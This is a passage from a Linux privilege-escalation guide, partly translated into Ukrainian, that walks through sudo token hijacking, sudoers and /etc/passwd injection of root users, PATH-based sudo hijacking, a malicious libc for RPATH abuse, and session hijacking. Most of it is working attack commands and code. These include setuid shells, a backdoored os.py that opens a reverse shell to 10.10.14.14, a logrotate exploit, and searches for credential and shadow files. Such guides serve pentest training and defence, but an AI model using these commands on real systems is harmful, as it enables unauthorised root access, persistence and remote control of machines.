> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Другий експлойт** (`exploit_v2.sh`) створить shell `sh` у _/tmp_, **власником якого буде root із setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Третій експлойт** (`exploit_v3.sh`) **створить файл sudoers**, який **зробить sudo tokens вічними та дозволить усім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **write permissions** у папці або в будь-якому з створених файлів всередині папки, ви можете використати binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **створити sudo token для user і PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є shell як цей user з PID 1234, ви можете **отримати sudo privileges** без need to know the password, зробивши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` і файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть бути прочитані лише користувачем root і групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви можете **отримати** деяку цікаву інформацію, а якщо ви можете **записати** будь-який файл, ви зможете **підвищити привілеї**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете писати, ви можете зловживати цим дозволом
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, наприклад `doas` для OpenBSD; не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини та використовує `sudo`** для підвищення привілеїв, і ви отримали shell у контексті цього користувача, ви можете **створити новий sudo executable**, який виконуватиме ваш code як root, а потім — команду користувача. Після цього **змініть $PATH** у контексті користувача (наприклад, додавши новий path у `.bash_profile`), щоб коли користувач запускає sudo, запускався ваш sudo executable.

Зверніть увагу: якщо користувач використовує інший shell (не bash), вам потрібно буде змінити інші файли, щоб додати новий path. Наприклад, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустити щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Файл `/etc/ld.so.conf` вказує **звідки завантажуються файли конфігурації**. Зазвичай цей файл містить такий шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що файли конфігурації з `/etc/ld.so.conf.d/*.conf` будуть прочитані. Ці файли конфігурації **вказують на інші папки**, у яких **шукатимуться** **libraries**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — це `/usr/local/lib`. **Це означає, що система шукатиме libraries всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** у будь-якому з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якому файлі всередині `/etc/ld.so.conf.d/` або будь-якій папці, зазначеній у конфігу всередині `/etc/ld.so.conf.d/*.conf`, він може мати змогу підвищити привілеї.\
Подивіться, **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши lib у `/var/tmp/flag15/`, вона буде використана програмою в цьому місці, як вказано в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Тоді створіть шкідливу бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримайте** файли з певними ACL з системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Прихований ACL backdoor у sudoers drop-ins

Поширена помилка конфігурації — файл у `/etc/sudoers.d/` з власником root і режимом `440`, який усе ще надає право запису користувачу з низькими привілеями через ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Якщо ви бачите щось на кшталт `user:alice:rw-`, користувач може додати sudo rule, попри restrictive mode bits:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Це шлях ACL persistence/privesc з високим впливом, тому що його легко пропустити під час перевірок лише через `ls -l`.

## Open shell sessions

У **старих версіях** ви можете **hijack** деяку **shell** сесію іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** лише до screen-сесій тільки **свого користувача**. Однак ви можете знайти **interesting information inside the session**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## hijacking сесій tmux

Це була проблема зі **старими версіями tmux**. Мені не вдалося hijack-нути сесію tmux (v2.1), створену root, як непривілейованому користувачу.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box from HTB** для прикладу.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL і SSH keys, згенеровані на системах на базі Debian (Ubuntu, Kubuntu тощо) між вереснем 2006 року та 13 травня 2008 року, можуть бути уражені цією помилкою.\
Ця помилка виникає під час створення нового ssh key в цих ОС, оскільки **було можливе лише 32,768 варіантів**. Це означає, що всі можливості можна обчислити, і **маючи ssh public key, ви можете шукати відповідний private key**. Обчислені варіанти можна знайти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Вказує, чи дозволена password authentication. Значення за замовчуванням — `no`.
- **PubkeyAuthentication:** Вказує, чи дозволена public key authentication. Значення за замовчуванням — `yes`.
- **PermitEmptyPasswords**: Коли password authentication дозволена, вказує, чи сервер дозволяє login до облікових записів із порожнім password. Значення за замовчуванням — `no`.

### Login control files

Ці файли впливають на те, хто може log in і як:

- **`/etc/nologin`**: якщо присутній, блокує non-root logins і виводить своє повідомлення.
- **`/etc/securetty`**: обмежує, звідки root може log in (TTY allowlist).
- **`/etc/motd`**: post-login banner (може leak середовище або деталі обслуговування).

### PermitRootLogin

Вказує, чи root може log in using ssh, значення за замовчуванням — `no`. Можливі значення:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Вказує файли, що містять public keys, які можна використовувати для user authentication. Вони можуть містити tokens на кшталт `%h`, які будуть замінені на home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Така конфігурація означатиме, що якщо ви спробуєте увійти за допомогою **private** key користувача "**testusername**", ssh порівняє public key вашого key з тими, що знаходяться в `/home/testusername/.ssh/authorized_keys` і `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **використовувати ваші локальні SSH keys замість того, щоб залишати keys** (без passphrases!) на вашому server. Тож ви зможете **jump** через ssh **до host** і звідти **jump** до іншого host, **використовуючи** **key**, що знаходиться у вашому **initial host**.

Потрібно встановити цю опцію в `$HOME/.ssh.config` ось так:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` дорівнює `*`, то кожного разу, коли користувач переходить на іншу машину, цей хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **override** цю **options** і дозволити або заборонити цю конфігурацію.\
Файл `/etc/sshd_config` може **allow** або **denied** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (default is allow).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим для підвищення привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Файл `/etc/profile` і файли в `/etc/profile.d/` — це **scripts that are executed when a user runs a new shell**. Тому, якщо ви можете **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено якийсь дивний profile script, слід перевірити його на **sensitive details**.

### Passwd/Shadow Files

Залежно від OS файли `/etc/passwd` і `/etc/shadow` можуть мати іншу назву або може існувати їхня резервна копія. Тому рекомендується **знайти всі з них** і **перевірити, чи можете ви їх читати**, щоб побачити, **чи є hashes** всередині файлів:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках ви можете знайти **password hashes** всередині файлу `/etc/passwd` (або еквівалентного)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наведених нижче команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Тоді додайте користувача `hacker` і додайте згенерований пароль.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Або ж ви можете використати такі рядки, щоб додати фіктивного користувача без пароля.\
WARNING: ви можете знизити поточний рівень безпеки машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: У BSD-платформах `/etc/passwd` розташований у `/etc/pwd.db` та `/etc/master.passwd`, а `/etc/shadow` перейменовано на `/etc/spwd.db`.

Ви повинні перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **змінювати файл конфігурації служби Tomcat всередині /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor буде виконано наступного разу, коли tomcat буде запущено.

### Check Folders

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned файли
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли SQLite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries у PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web files**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Прочитайте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий tool**, який ви можете використовувати для цього, — [**LaZagne**](https://github.com/AlessandroZ/LaZagne), open source application, used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac.

### Logs

Якщо ви можете читати logs, ви можете знайти всередині них **цікаву/конфіденційну information**. Чим дивніший log, тим цікавішим він буде (ймовірно).\
Також деякі "**bad**" configured (backdoored?) **audit logs** можуть дозволити вам **record passwords** всередині audit logs, як пояснено в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати логи**, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Вам також слід перевірити файли, що містять слово "**password**" у **назві** або всередині **вмісту**, а також перевірити IP-адреси й emails у логах, або hashes regexps.\
Я не буду тут перераховувати, як робити все це, але якщо вам цікаво, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Writable files

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконуватися python script, і **можете записувати** у ту папку або **можете модифікувати python libraries**, ви можете змінити OS library і backdoor її (якщо ви можете записувати туди, де буде виконуватися python script, скопіюйте та вставте library os.py).

Щоб **backdoor**-ити library, просто додайте в кінець library os.py таку строку (змініть IP і PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Уразливість у `logrotate` дає змогу користувачам із **правами запису** до log-файлу або його батьківських директорій потенційно отримати підвищені привілеї. Це тому, що `logrotate`, який часто працює як **root**, можна змусити виконати довільні файли, особливо в директоріях на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, а й у будь-якій директорії, де застосовується log rotation.

> [!TIP]
> Ця уразливість стосується `logrotate` версії `3.18.0` і старіших

Докладнішу інформацію про цю уразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю уразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тож коли знаходите, що можете змінювати logs, перевіряйте, хто керує цими logs, і чи можна підвищити привілеї, підмінивши logs на symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з будь-якої причини користувач може **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** може **змінити** існуючий, тоді вашу **system is pwned**.

Network scripts, _ifcg-eth0_ наприклад, використовуються для мережевих з’єднань. Вони виглядають точно як .INI файли. Однак у Linux вони \~sourced\~ через Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих network scripts обробляється некоректно. Якщо в назві є **white/blank space**, система намагається виконати частину після white/blank space. Це означає, що **все після першого blank space виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на порожній пробіл між Network і /bin/id_)

### **init, init.d, systemd, and rc.d**

Каталог `/etc/init.d` є домом для **скриптів** для System V init (SysVinit), **класичної системи керування сервісами Linux**. Він містить скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Їх можна виконувати напряму або через символічні посилання, що знаходяться в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов’язаний з **Upstart**, новішою **системою керування сервісами**, запровадженою Ubuntu, яка використовує файли конфігурації для задач керування сервісами. Попри перехід на Upstart, скрипти SysVinit і далі використовуються разом із конфігураціями Upstart через шар сумісності в Upstart.

**systemd** постає як сучасний ініціалізатор і менеджер сервісів, пропонуючи розширені можливості, такі як запуск daemon за запитом, керування automount і знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутива та `/etc/systemd/system/` для змін адміністратора, спрощуючи процес адміністрування системи.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Втеча з restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай hook-ять syscall, щоб надати користувацькому manager привілейовану kernel-функціональність. Слабка автентифікація manager (наприклад, перевірки signatures на основі порядку FD або погані схеми паролів) може дозволити локальному app видавати себе за manager і підвищити привілеї до root на вже root-нутому пристрої. Дізнайтеся більше та про деталі exploitation тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery у VMware Tools/Aria Operations може витягувати шлях до binary з command line процесів і виконувати його з -v у привілейованому контексті. Надто permissive patterns (наприклад, використанням \S) можуть збігатися з listeners, підготовленими attacker, у writable locations (наприклад, /tmp/httpd), що призводить до виконання як root (CWE-426 Untrusted Search Path).

Дізнайтеся більше та подивіться generalized pattern, який можна застосувати до інших discovery/monitoring stacks, тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Найкращий tool для пошуку vectors local privilege escalation у Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Перелічує kernel vulns у Linux і MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
